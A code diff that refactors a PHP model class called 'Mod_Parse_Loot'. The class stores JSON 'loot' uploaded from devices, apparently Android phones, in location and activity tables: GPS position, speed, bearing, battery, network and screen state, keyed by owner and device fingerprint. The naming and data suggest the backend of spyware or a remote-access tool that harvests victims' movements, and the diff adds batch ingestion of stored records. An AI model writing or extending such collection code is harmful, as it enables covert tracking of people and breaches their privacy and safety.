@@ -595,54 +595,35 @@ class Mod_Parse_Loot extends Model
             $extracted_at = $json['extracted_at'] ?? null;
             $recordsInserted = 0;
 
-            // 1. Process Location Data
+            // 1. Process Location Data (singular snapshot)
             if (isset($json['location'])) {
-                $loc = $json['location'];
-                $locationData = [
-                    'owner_id'      => $var_file_owner,
-                    'device_id'     => $var_file_print,
-                    'latitude'      => $loc['latitude'] ?? null,
-                    'longitude'     => $loc['longitude'] ?? null,
-                    'accuracy'      => $loc['accuracy'] ?? null,
-                    'altitude'      => $loc['altitude'] ?? null,
-                    'bearing'       => $loc['bearing'] ?? null,
-                    'speed'         => $loc['speed'] ?? null,
-                    'provider'      => $loc['provider'] ?? null,
-                    'location_time' => $loc['time'] ?? null,
-                    'status'        => $loc['status'] ?? ($loc['latitude'] ? 'success' : 'no_location_found'),
-                    'extracted_at'  => $extracted_at,
-                    'created_at'    => $dated,
-                    'updated_at'    => $dated
-                ];
-
-                if ($this->db->table('tbl_location')->insert($locationData)) {
+                if ($this->insertLocationRow($json['location'], $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                     $recordsInserted++;
                 }
             }
 
-            // 2. Process Activity Data
-            if (isset($json['activity'])) {
-                $act = $json['activity'];
-                $activityData = [
-                    'owner_id'       => $var_file_owner,
-                    'device_id'      => $var_file_print,
-                    'status'         => $act['status'] ?? 'feature_not_fully_implemented',
-                    'activity_type'  => $act['activity_type'] ?? null,
-                    'confidence'     => $act['confidence'] ?? 0,
-                    'info'           => $act['info'] ?? null,
-                    'is_interactive' => isset($act['is_interactive']) ? ($act['is_interactive'] ? 1 : 0) : 0,
-                    'battery_level'  => $act['battery_level'] ?? null,
-                    'charging_status'=> $act['charging_status'] ?? null,
-                    'network_type'   => $act['network_type'] ?? null,
-                    'screen_on'      => isset($act['screen_on']) ? ($act['screen_on'] ? 1 : 0) : 0,
-                    'extracted_at'   => $extracted_at,
-                    'activity_time'  => $act['activity_time'] ?? null,
-                    'created_at'     => $dated,
-                    'updated_at'     => $dated
-                ];
+            // 1b. Process Location Data (array format from Room-persisted records)
+            if (isset($json['locations']) && is_array($json['locations'])) {
+                foreach ($json['locations'] as $loc) {
+                    if ($this->insertLocationRow($loc, $var_file_owner, $var_file_print, $extracted_at, $dated)) {
+                        $recordsInserted++;
+                    }
+                }
+            }
 
-                if ($this->db->table('tbl_activity')->insert($activityData)) {
+            // 2. Process Activity Data (singular snapshot)
+            if (isset($json['activity'])) {
+                if ($this->insertActivityRow($json['activity'], $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                     $recordsInserted++;
+                }
+            }
+
+            // 2b. Process Activity Data (array format from Room-persisted records)
+            if (isset($json['activities']) && is_array($json['activities'])) {
+                foreach ($json['activities'] as $act) {
+                    if ($this->insertActivityRow($act, $var_file_owner, $var_file_print, $extracted_at, $dated)) {
+                        $recordsInserted++;
+                    }
                 }
             }
 
@@ -650,6 +631,67 @@ class Mod_Parse_Loot extends Model
 
         } catch (\Exception $e) {
             log_message('error', 'get_location exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * Inserts a single location row.
+     */
+    private function insertLocationRow(array $loc, int $ownerId, string $devicePrint, ?string $extractedAt, string $dated): bool
+    {
+        $locationData = [
+            'owner_id'      => $ownerId,
+            'device_id'     => $devicePrint,
+            'latitude'      => $loc['latitude'] ?? null,
+            'longitude'     => $loc['longitude'] ?? null,
+            'accuracy'      => $loc['accuracy'] ?? null,
+            'altitude'      => $loc['altitude'] ?? null,
+            'bearing'       => $loc['bearing'] ?? null,
+            'speed'         => $loc['speed'] ?? null,
+            'provider'      => $loc['provider'] ?? null,
+            'location_time' => $loc['location_time'] ?? $loc['time'] ?? null,
+            'status'        => $loc['status'] ?? (!empty($loc['latitude']) ? 'success' : 'no_location_found'),
+            'extracted_at'  => $extractedAt ?? $loc['fetched_at'] ?? null,
+            'created_at'    => $dated,
+            'updated_at'    => $dated
+        ];
+
+        try {
+            return (bool) $this->db->table('tbl_location')->insert($locationData);
+        } catch (\Exception $e) {
+            log_message('error', 'insertLocationRow failed: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * Inserts a single activity row.
+     */
+    private function insertActivityRow(array $act, int $ownerId, string $devicePrint, ?string $extractedAt, string $dated): bool
+    {
+        $activityData = [
+            'owner_id'       => $ownerId,
+            'device_id'      => $devicePrint,
+            'status'         => $act['status'] ?? 'feature_not_fully_implemented',
+            'activity_type'  => $act['activity_type'] ?? null,
+            'confidence'     => $act['confidence'] ?? 0,
+            'info'           => $act['info'] ?? null,
+            'is_interactive' => isset($act['is_interactive']) ? ($act['is_interactive'] ? 1 : 0) : 0,
+            'battery_level'  => $act['battery_level'] ?? null,
+            'charging_status'=> $act['charging_status'] ?? null,
+            'network_type'   => $act['network_type'] ?? null,
+            'screen_on'      => isset($act['screen_on']) ? ($act['screen_on'] ? 1 : 0) : 0,
+            'extracted_at'   => $extractedAt ?? $act['fetched_at'] ?? null,
+            'activity_time'  => $act['activity_time'] ?? null,
+            'created_at'     => $dated,
+            'updated_at'     => $dated
+        ];
+
+        try {
+            return (bool) $this->db->table('tbl_activity')->insert($activityData);
+        } catch (\Exception $e) {
+            log_message('error', 'insertActivityRow failed: ' . $e->getMessage());
             return false;
         }
     }
